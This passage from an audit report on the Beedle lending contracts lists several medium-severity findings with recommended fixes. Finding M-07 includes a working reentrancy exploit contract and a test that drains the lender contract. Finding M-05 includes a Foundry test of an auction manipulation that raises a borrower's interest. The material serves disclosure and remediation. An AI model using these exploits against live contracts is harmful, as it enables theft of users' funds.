For `loan asset's case` (which affects the lender) there is a withdrawal possibility of loan funds via Lender.sol's [removeFromPool()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L198C14-L198C28), but for the lender there is no way to transfer funds due to ownership or even specify transfer recipient, so the corresponding loan funds will be frozen with the pool if current lender is blacklisted.

## Impact
Principal funds of borrower or lender can be permanently frozen in full, but blacklisting is a low probability event, so setting the severity to be medium.

## Tools Used
Manual

## Recommendations
Consider adding the `recipient` argument to the `repay()`, `seizeLoan()` and `removeFromPool()` functions, so the balance beneficiary `msg.sender` can specify what address should receive the funds, for example:

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L198

```diff
-  function removeFromPool(bytes32 poolId, uint256 amount) external {
+  function removeFromPool(bytes32 poolId, uint256 amount, address recipient) external {
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        if (amount == 0) revert PoolConfig();
        _updatePoolBalance(poolId, pools[poolId].poolBalance - amount);
        // transfer the loan tokens from the contract to the lender
-       IERC20(pools[poolId].loanToken).transfer(msg.sender, amount);
+       IERC20(pools[poolId].loanToken).transfer(recipient, amount);
    }

```

Similar modifications for other functions. In the case of the `repay()` function, which can be call by anyone, allowing setting a recipient would make the collateral asset going straight to that address even if it's not the borrower's address. So, we can make a check here:

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L292

```diff
-  function repay(uint256[] calldata loanIds) public {
+  function repay(uint256[] calldata loanIds, address recipient) public {
      ...
-           IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
+       if (loan.borrower == msg.sender) {
            IERC20(loan.collateralToken).transfer(
                recipient,
                loan.collateral
            );
        } else {
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
        } 
       ...
    }

```
## <a id='M-04'></a>M-04. No expiration deadline leads to losing a lot of funds

_Submitted by [pyro](https://profiles.cyfrin.io/u/undefined), [daciantemp](https://profiles.cyfrin.io/u/undefined), [Martin](https://profiles.cyfrin.io/u/undefined), [fakemonkgin](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [Vagner](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [aviggiano](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [Harut](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [niluke](https://profiles.cyfrin.io/u/undefined), [0xJuda](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [JohnnyTime](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [pks271](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Yanev](https://profiles.cyfrin.io/u/undefined), [0xsilvermist](https://profiles.cyfrin.io/u/undefined), [Madalad](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [smbv1923](https://profiles.cyfrin.io/u/undefined), [breeje](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [gkrastenov](https://profiles.cyfrin.io/u/undefined), [hlx](https://profiles.cyfrin.io/u/undefined), [offkey](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L36

## Summary

The `Fees::sellProfits()` does not set an expiration deadline, resulting in losing a lot of funds when swapping tokens.

## Vulnerability Details

The `deadline` parameter in the `sellProfits()` is set to `block.timestamp`. That means the function will accept a token swap at any block number (i.e., no expiration deadline). 

```solidity
    function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
@>              deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L36

## Impact

Without an expiration deadline, a malicious miner/validator can hold a transaction until they favor it or they can make a profit. As a result, the `Fees` contract can lose a lot of funds from slippage.

## Tools Used

Manual Review

## Recommendations

I recommend setting the `deadline` parameter with a proper timestamp.
## <a id='M-05'></a>M-05. Malicious lender can increment the loan interest using the auction process

_Submitted by [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [8olidity](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xbepresent](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L437

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

## Summary

Malicious lender can increment the loan interest using the auction process making the borrower to pay more interests from his loan.

## Vulnerability Details

The malicious lender can abuse of the auction process in order to increment the borrower loan interests. Please see the next scenario:

1. Malicious lender create the pool1 and borrower borrows 100 debt token from the pool at 0.1% interest.
2. Malicious lender starts an auction for the loan using the [startAuction()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L437) function.
3. Now, anybody can buy the auctioned loan using the [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465) function. If there is an intention from someone to buy the auctioned loan, the malicious lender frontrun the transaction and cancel the auction via the [giveLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355) function, so now the `buyLoan()` will be reverted because the loan is NOT in auction.
4. The malicious lender repeat the process until nobody cares about the auctioned loan. So now the malicious lender can wait until the end of the auction process and get the [maximum possible interest](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L475).
5. Now, the malicious lender can call `buyLoan()` and assign the loan to a malicious pool which has an maximum possible interest.
6. The borrower loan interest has increased by a malicious lender.

I created a test where the malicious lender1 increments the loan interest rate from 0.1% to 1000%. Test steps:

1. `Lender1` creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
   Borrower borrows 100 debt and put 100 collateral.
2. `Lender1` starts an auction
3. There is an interested pool in buying the loan but `Lender1` frontrun an restart the
   auction via giveLoan(), so the loan is not possible to buy.
4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
   and Pool balance is the same 900 tokens. 
5. It is not possible to buy the loan since the auction was restarted in the step 3.
6. `Lender1` creates a malicious pool in coalition with a malicious actor.
   The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
   another private key.
7. `Lender1` starts the auction again and warp to the end of the auction.
8. `Lender1` buys the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
   The lender1 maliciously increments the loan interest.

```solidity
// test/Lender.t.sol:LenderTest
// $ forge test --match-test "test_malicious_lender_can_increment_loan_interest" -vvv
    function test_malicious_lender_can_increment_loan_interest() public {
        // Malicious lender can increment the loan interest using the auction process
        // 1. Lender1 creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
        //    Borrower borrows 100 debt and put 100 collateral.
        // 2. Lender1 starts an auction
        // 3. There is an interested pool in buying the loan but Lender1 frontrun an restart the
        //    auction via giveLoan(), so the loan is not possible to buy.
        // 4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
        //    and Pool balance is the same 900 tokens. 
        // 5. It is not possible to buy the loan since the auction was restarted in the step 3.
        // 6. Lender1 creates a maliciouspool in coalition with a malicious actor.
        //    The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
        //    another private key.
        // 7. Lender1 starts the auction again and warp to the end of the auction.
        // 8. Lender1 buy the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
        //    The lender1 maliciously increments the loan interest.
        address attacker = address(1337);
        loanToken.mint(address(attacker), 100000*10**18);
        collateralToken.mint(address(attacker), 100000*10**18);
        //
        // 1. Lender1 creates a pool with 1000 balance, 0.1% interest rate and auction length 1 days.
        //    Borrower borrows 100 debt and put 100 collateral.
        //
        test_borrow();
        bytes32 poolIdLender1 = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        // assert loan debt, loan collateral and final pool balance
        (,,,,uint256 poolBalance,,,,) = lender.pools(poolIdLender1);
        (,,,,,uint256 collaterlLoan,uint256 newLoanInterestRate,,,) = lender.loans(0);
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
        assertEq(collaterlLoan, 100 * 10**18);
        assertEq(newLoanInterestRate, 1000); // Loan interest 0.1%
        assertEq(poolBalance, 900 * 10**18); // 1000 pool balance - 100 loan debt
        //
        // 2. Lender1 starts an auction
        //
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.startPrank(lender1);
        lender.startAuction(loanIds);
        (,,,,,,,,uint256 auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, block.timestamp); // auction has started
        //
        // 3. There is an interested pool in buying the loan but Lender1 frontrun an restart the
        // auction via giveLoan(), so the loan is not possible to buy().
        //
        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = poolIdLender1;
        lender.giveLoan(loanIds, poolIds); // malicious lender restart the auction using the giveLoan() function
        //
        // 4. Auction is restarted. Debt is the same 100 tokens, collateral balance is the same 100 tokens
        //    and Pool balance is the same 900 tokens
        //
        (,,,,,,,,auctionStartTime,) = lender.loans(0);
        assertEq(auctionStartTime, type(uint256).max); // auction is restarted
        (,,,,poolBalance,,,,) = lender.pools(poolIdLender1);
        (,,,,,collaterlLoan,,,,) = lender.loans(0);
        assertEq(lender.getLoanDebt(0), 100 * 10**18);
        assertEq(collaterlLoan, 100 * 10**18);
        assertEq(poolBalance, 900 * 10**18); // 1000 pool balance - 100 loan debt
        //
        // 5. It is not possible to buy the loan since the auction was restarted in the step 3
        //
        vm.expectRevert(AuctionNotStarted.selector);
        lender.buyLoan(0, keccak256(abi.encode("whateverpoolIdDoesNotMatterBecuaseWillBeRevertedBeforeAnythinElse")));
        vm.stopPrank();
        //
        // 6. Lender1 creates a maliciouspool in coalition with a malicious actor.
        // The malicious pool will have the maximum interest 1000%. This new pool can be a pool from the same lender using
        // another private key.
        //
        vm.startPrank(attacker);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        Pool memory attackerP = Pool({
            lender: attacker,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 100000, // maximum interest
            outstandingLoans: 0
        });
        bytes32 poolIdAttacker = lender.setPool(attackerP);
        vm.stopPrank();
        //
        // 7. Lender1 starts the auction again and warp to the end of the auction.
        //
        vm.startPrank(lender1);
        lender.startAuction(loanIds);
        // warp
        vm.warp(block.timestamp + 24 hours);
        //
        // 8. Lender1 buy the auctioned loan to his malicious pool. Now the loan has a 1000% interest.
        // The lender1 maliciously increments the loan interest.
        //
        lender.buyLoan(0, poolIdAttacker);
        (,,,,,,newLoanInterestRate,,,) = lender.loans(0);
        assertEq(newLoanInterestRate, 100000); // loan interest is 1000% rate
    }
```

## Impact

Malicious lender can make the borrower to pay more interests for the loan without the borrower's consent. Since the interests can be incremented to 1000% the borrower may not be prepared to this increment and lost his collateral.

## Tools used

Manual review

## Recommendations

Don't allow the lender to set the same pool the loan has in the [giveLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355) function so the auction can not be restarted and a malicious lender can not restart the auction and benefit from this process. 

```diff
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
            uint256 loanId = loanIds[i];
            bytes32 poolId = poolIds[i];
            // get the loan info
            Loan memory loan = loans[loanId];
            // validate the loan
            if (msg.sender != loan.lender) revert Unauthorized();
            // get the pool info
            Pool memory pool = pools[poolId];
++          // Validate the pool is not the same
++          if (pool.lender == loan.lender) revert();
```
## <a id='M-06'></a>M-06. Single-step process for critical ownership transfer is risky

_Submitted by [rhaosec](https://profiles.cyfrin.io/u/undefined), [polaris_tow](https://profiles.cyfrin.io/u/undefined), [tpwn](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [cholakovv](https://profiles.cyfrin.io/u/undefined), [0xbug](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [fakemonkgin](https://profiles.cyfrin.io/u/undefined), [0xNiloy](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [Phantasmagoria](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [0xl3xx](https://profiles.cyfrin.io/u/undefined), [p4y4b13](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [Harut](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [ne0n](https://profiles.cyfrin.io/u/undefined), [larsson](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [HarisNabeel13](https://profiles.cyfrin.io/u/undefined), [arnie](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [zanybonzy](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [flacko](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [sma4](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [chainnue](https://profiles.cyfrin.io/u/undefined), [Deivitto](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [turvec](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xAsen](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L10

## Summary
Single-step process for critical ownership transfer is risky due to possible human error which could result in locking all the functions that use the onlyOwner modifier.
## Vulnerability Details
The custom contract Ownable.sol is inherited by Lender.sol which gives ownable functionality. 

However, its implementation is not safe currently as the process is 1-step which is risky due to a possible human error and such an error is unrecoverable. For example, an incorrect address, for which the private key is not known, could be passed accidentally.
## Impact
Critical functions using the onlyOwner modifier will be locked - setLenderFee(), setBorrowerFee(), setFeeReceiver().
## Tools Used
Manual review
## Recommendations
Implement the change of ownership in 2 steps:
1. Approve a new address as a pendingOwner
2. A transaction from the pendingOwner address claims the pending ownership change.

This mitigates the risk because if an incorrect address is used in step (1) then it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the ownership change.

## <a id='M-07'></a>M-07. Lender contract can be drained by re-entrancy in `seizeLoan`

_Submitted by [mahdirostami](https://profiles.cyfrin.io/u/undefined), [jigster](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [HALITUS](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Mlome](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565

## Summary
Tokens allowing reentrant calls on transfer can be drained from the contract.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `seizeLoan` function. When the a loan is put up for auction and the auction finishes, the `collateral` can be collected by the lender, the `collateralToken` are sent to the lender before updating the state.
```solidity
File: Lender.Sol

L565:	IERC20(loan.collateralToken).transfer( // @audit - Re-entrancy can drain the contract
        loan.lender,
        loan.collateral - govFee
    );

    bytes32 poolId = keccak256(
        abi.encode(loan.lender, loan.loanToken, loan.collateralToken)
    );

    // update the pool outstanding loans
    pools[poolId].outstandingLoans -= loan.debt;

    emit LoanSiezed(
        loan.borrower,
        loan.lender,
        loanId,
        loan.collateral
    );
    // delete the loan
    delete loans[loanId];
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565

An attacker can take a loan in his own pool and seize it, then the hook on token transfer allows him to re-enter the `seizeLoan` function to extract another time the collateral amount from the contract.

## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit6.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit6  {
    Lender lender;
    address loanToken;
    bool auctionEnded;
    bytes32 attackerPoolId;

    constructor(Lender _lender, address _loanToken) {
        lender = _lender;
        loanToken = _loanToken;
    }

    function attackPart1(address _loanToken, address _collateralToken) external {
        ERC20(_loanToken).approve(address(lender), type(uint256).max);
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Create a new pool        
        Pool memory pool = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 100,
            maxLoanRatio: type(uint256).max,
            auctionLength: 5 minutes,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        attackerPoolId = poolId;
        // (2) Take a loan in his own pool
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (3) Take a second loan in his own pool to increase the pool `outstandingLoans` amount
        b = Borrow({
            poolId: poolId,
            debt: 99,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Put the first loan up for auction
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.startAuction(loanIds);      
    }

    function attackPart2(address _loanToken, address _collateralToken) external {
        // (4) Seize the loan
        auctionEnded = true;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        lender.seizeLoan(loanIds);
        // (8) Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
        require(msg.sender == loanToken, "not loan token");
        if (from == address(lender) && auctionEnded) {
            uint256 lenderBalance = ERC20(loanToken).balanceOf(address(lender));
            if (lenderBalance >= 1_000*10**18) {
                // (6) Re-enter the `seizeLoan` function
                uint256[] memory loanIds = new uint256[](1);
                loanIds[0] = 0;
                lender.seizeLoan(loanIds);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    address attacker = address(0x5);
    // Setup
    vm.startPrank(lender1);
    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
    weirdToken.transfer(address(lender), 10_000*10**18); 
    weirdToken.transfer(address(attacker), 1_000*10**18 + 1);
    loanToken.transfer(address(attacker), 100);

    assertEq(loanToken.balanceOf(address(lender)), 0);                  
    assertEq(weirdToken.balanceOf(address(lender)), 10_000*10**18);     // Lender contract has 10_000 weirdTokens
    assertEq(loanToken.balanceOf(address(attacker)), 100);              // Attacker has a few wei of loanToken
    assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18 + 1);    // Attacker has 1_000 weirdTokens     

    // Exploit starts here
    vm.startPrank(attacker);
    Exploit6 attackContract = new Exploit6(lender, address(weirdToken));
    weirdToken.transfer(address(attackContract), 1_000*10**18 + 1);
    loanToken.transfer(address(attackContract), 100);

    attackContract.attackPart1(address(loanToken), address(weirdToken));
    vm.warp(block.timestamp + 5 minutes); // Wait 5 minutes for the end of the auction
    attackContract.attackPart2(address(loanToken), address(weirdToken));

    // Pool has been drained
    assertEq(loanToken.balanceOf(address(lender)), 0);              
    assertEq(weirdToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
    assertEq(loanToken.balanceOf(address(attacker)), 100);   
    assertEq(weirdToken.balanceOf(address(attacker)), 10_945*10**18); // Attacker has 11_000 weirdTokens (minus the fees)   
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by performing the token transfers at the end of the `seizeLoan` function AND use nonReentrant modifiers
## <a id='M-08'></a>M-08. Fixed fee level is used when swap tokens on Uniswap

_Submitted by [n1punp](https://profiles.cyfrin.io/u/undefined), [Rotcivegaf](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [0xJuda](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [AkiraKodo](https://profiles.cyfrin.io/u/undefined), [0xcm](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined), [trachev](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [hlx](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Juntao](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L34

## Summary
Fixed fee level is used when swap tokens on Uniswap.

## Vulnerability Details
In [Fees contract](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L11), [sellProfits(…)](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26-L44) funtion is used to swap loan tokens for collateral tokens from liquidations, when constructs [ISwapRouter.ExactInputSingleParams](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/interfaces/ISwapRouter.sol#L5-L14), a fixed fee 3000 (0.3%) level is used:
```
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
```
However, not all pools in Uniswap are created with fee level being 3000, for example, fee level of XMON / ETH
 (0x59b4bb1f5d943cf71a10df63f6b743ee4a4489ee) on Mainnet is 10000 (1%), fee level of WETH / BOB (0x1a54ae9f662b463f8d432482975c17e51518b50d) on Optimism is 500 (0.05%).

## Impact
Using fixed fee level when swap tokens  may lead to some fee tokens being locked in contract.

## Tools Used
Manual Review

## Recommendations
Passing fee level to sellProfits(…) function as parameter:
```diff
-   function sellProfits(address _profits) public {
+   function sellProfits(address _profits, uint24 fee) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));


        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
-               fee: 3000,
+               fee: fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });


        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```
## <a id='M-09'></a>M-09. Pragma non-specification can lead to non-functional / corrupted contract when deployed on Arbitrum

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [SA110](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SA110](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/ISwapRouter.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Errors.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol#L2

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Structs.sol#L2

## Summary

Pragma has been set to ^0.8.19 allowing the contracts to be compiled with a compiler equal or greater than 0.8.19. The problem with compiling is that Arbitrum is NOT compatible with 0.8.20 and later.

## Vulnerability Details
Contracts compiled with non specified versions will result in a non-functional or potentially damaged version that won't behave as expected. The default behaviour of compiler would be to use the newest version which would mean by default it will be compiled with the 0.8.20 version which will produce broken code.


## Impact
